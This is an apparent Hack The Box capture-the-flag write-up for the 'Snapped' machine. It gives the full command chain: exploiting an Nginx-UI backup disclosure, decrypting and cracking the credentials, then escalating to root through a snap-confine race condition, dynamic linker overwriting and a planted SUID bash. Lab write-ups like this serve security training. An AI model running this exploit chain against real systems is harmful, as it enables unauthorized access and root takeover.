Snapped - Hack The Box Writeup
Overview

Snapped is a hard Linux machine focused on exploiting modern vulnerabilities in Nginx-UI and snapd.
The machine demonstrates:

CVE-2026-27944 → Unauthenticated Nginx-UI backup disclosure
CVE-2026-3888 → snap-confine privilege escalation
TOCTOU race conditions
Dynamic linker hijacking
Linux namespace abuse
Enumeration
Nmap
nmap -sCV 10.129.242.192
Results
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
80/tcp open  http  nginx 1.24.0

Add the domain:

echo "10.129.242.192 snapped.htb" | sudo tee -a /etc/hosts
Subdomain Enumeration
ffuf -w /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt \
-u http://FUZZ.snapped.htb -ic
Result
admin

Add subdomain:

echo "10.129.242.192 admin.snapped.htb" | sudo tee -a /etc/hosts
Foothold

Visiting:

http://admin.snapped.htb

reveals an Nginx-UI login page.

API Enumeration
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
-u http://admin.snapped.htb/api/FUZZ -ic
Interesting Endpoints
backup
licenses
CVE-2026-27944 — Nginx-UI Backup Disclosure

Download backup:

curl -OJ http://admin.snapped.htb/api/backup

Response headers expose the encryption key and IV:

X-Backup-Security:
Uggi+bPybhVny2dV+MaAVAkjSrzQBCjWFhbsenNiVJA=:Jky/YQ0ISOX3gcTE9lj7zQ==
Backup Decryption
Decode Key
key=$(echo 'Uggi+bPybhVny2dV+MaAVAkjSrzQBCjWFhbsenNiVJA=' | base64 -d | xxd -p -c 256)
Decode IV
iv=$(echo 'Jky/YQ0ISOX3gcTE9lj7zQ==' | base64 -d | xxd -p)
Extract Backup
unzip -d backup backup-20260319-121723.zip
Decrypt nginx-ui.zip
openssl enc -aes-256-cbc -d \
-in nginx-ui.zip \
-out nginxui_decrypted.zip \
-K $key \
-iv $iv

Extract decrypted archive:

unzip nginxui_decrypted.zip
Database Enumeration

Open database:

sqlite3 database.db

List tables:

.tables

Dump users:

select * from users;

Two bcrypt hashes are recovered.

Password Cracking
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt

Credentials found:

jonathan:linkinpark
SSH Access
ssh jonathan@snapped.htb

User access obtained.

Privilege Escalation
snapd Enumeration
snap --version
Vulnerable Version
snapd 2.63.1

Target is vulnerable to CVE-2026-3888.

Exploitation
Enter Firefox Sandbox
env -i SNAP_INSTANCE_NAME=firefox \
/usr/lib/snapd/snap-confine --base core22 \
snap.firefox.hook.configure /bin/bash

Inside sandbox:

cd /tmp
echo $$

Save the PID.

Wait for Cleanup
while test -d ./.snap; do
    touch ./
    sleep 1
done
Access Namespace
cd /proc/<PID>/cwd
Destroy Cached Namespace
systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash

env -i SNAP_INSTANCE_NAME=firefox \
/usr/lib/snapd/snap-confine --base snapd \
snap.firefox.hook.configure /nonexistent
Compile Exploit
gcc -O2 -static -o firefox_2404 firefox_2404.c
gcc -nostdlib -static -Wl,--entry=_start \
-o librootshell.so librootshell.c
Run Exploit
~/firefox_2404 ~/payload.so

Expected output:

[!] TRIGGER DETECTED! Swapping .exchange...
[+] SWAP DONE!
Dynamic Linker Hijacking
cp /usr/bin/busybox ./tmp/sh

cat ~/librootshell.so > \
./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
Get Root
env -i SNAP_INSTANCE_NAME=firefox \
/usr/lib/snapd/snap-confine --base core22 \
snap.firefox.hook.configure /usr/lib/snapd/snap-confine

Root shell:

uid=0(root)
Sandbox Escape

Persist SUID bash:

cp /bin/bash /var/snap/firefox/common/bash
chmod 4755 /var/snap/firefox/common/bash

Execute:

/var/snap/firefox/common/bash -p
Root Access
id
euid=0(root)
Vulnerabilities
CVE	Description
CVE-2026-27944	Unauthenticated Nginx-UI backup disclosure
CVE-2026-3888	snap-confine TOCTOU privilege escalation
Tools Used
Nmap
FFUF
cURL
SQLite3
Hashcat
OpenSSL
GCC
snap-confine
Conclusion

Snapped is an advanced Linux machine combining web exploitation with low-level Linux privilege escalation techniques including race conditions, namespace abuse, and dynamic linker hijacking.
